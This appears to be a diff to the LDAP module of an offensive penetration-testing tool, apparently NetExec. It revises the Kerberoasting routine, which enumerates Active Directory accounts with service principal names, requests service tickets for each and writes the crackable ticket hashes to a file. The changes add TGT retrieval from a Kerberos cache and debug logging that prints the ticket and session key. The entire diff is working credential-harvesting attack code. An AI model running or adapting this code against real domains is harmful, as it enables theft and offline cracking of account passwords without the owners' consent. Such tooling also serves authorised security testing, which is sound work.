@@ -910,6 +910,9 @@ class ldap(connection):
             "lastLogon",
         ]
         resp = self.search(searchFilter, attributes, 0)
+        self.logger.debug(f"Search Filter: {searchFilter}")
+        self.logger.debug(f"Attributes: {attributes}")
+        self.logger.debug(f"Response: {resp}")
         if not resp:
             self.logger.highlight("No entries found!")
         elif resp:
@@ -956,41 +959,46 @@ class ldap(connection):
 
             if len(answers) > 0:
                 self.logger.display(f"Total of records returned {len(answers):d}")
-                TGT = KerberosAttacks(self).get_tgt_kerberoasting()
-                dejavue = []
-                for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
-                    if sAMAccountName not in dejavue:
-                        downLevelLogonName = self.targetDomain + "\\" + sAMAccountName
+                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
+                self.logger.debug(f"TGT: {TGT}")
+                if TGT:
+                    dejavue = []
+                    for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
+                        if sAMAccountName not in dejavue:
+                            downLevelLogonName = self.targetDomain + "\\" + sAMAccountName
 
-                        try:
-                            principalName = Principal()
-                            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-                            principalName.components = [downLevelLogonName]
+                            try:
+                                principalName = Principal()
+                                principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
+                                principalName.components = [downLevelLogonName]
 
-                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
-                                principalName,
-                                self.domain,
-                                self.kdcHost,
-                                TGT["KDC_REP"],
-                                TGT["cipher"],
-                                TGT["session_key"],
-                            )
-                            r = KerberosAttacks(self).output_tgs(
-                                tgs,
-                                oldSessionKey,
-                                sessionKey,
-                                sAMAccountName,
-                                self.targetDomain + "/" + sAMAccountName,
-                            )
-                            self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
-                            self.logger.highlight(f"{r}")
-                            with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
-                                hash_kerberoasting.write(r + "\n")
-                            dejavue.append(sAMAccountName)
-                        except Exception as e:
-                            self.logger.debug("Exception:", exc_info=True)
-                            nxc_logger.error(f"Principal: {downLevelLogonName} - {e}")
-                return True
+                                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                                    principalName,
+                                    self.domain,
+                                    self.kdcHost,
+                                    TGT["KDC_REP"],
+                                    TGT["cipher"],
+                                    TGT["sessionKey"],
+                                )
+                                r = KerberosAttacks(self).output_tgs(
+                                    tgs,
+                                    oldSessionKey,
+                                    sessionKey,
+                                    sAMAccountName,
+                                    self.targetDomain + "/" + sAMAccountName,
+                                )
+                                self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
+                                self.logger.highlight(f"{r}")
+                                if self.args.kerberoasting:
+                                    with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
+                                        hash_kerberoasting.write(r + "\n")
+                                dejavue.append(sAMAccountName)
+                            except Exception as e:
+                                self.logger.debug("Exception:", exc_info=True)
+                                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
+                    return True
+                else:
+                    self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
             else:
                 self.logger.highlight("No entries found!")
         self.logger.fail("Error with the LDAP account used")
